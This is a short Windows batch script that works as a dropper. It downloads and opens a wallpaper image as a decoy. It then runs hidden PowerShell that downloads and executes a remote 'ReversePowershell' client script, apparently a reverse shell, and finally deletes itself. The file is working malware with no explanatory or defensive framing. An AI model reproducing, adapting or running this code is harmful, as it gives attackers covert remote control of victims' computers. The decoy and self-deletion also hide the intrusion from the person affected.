@echo off
set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1
powershell -c "Invoke-WebRequest http://www.picturesnew.com/media/images/picture-wallpaper.jpg -OutFile ./pic.jpg"
pic.jpg
powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
del "%~f0"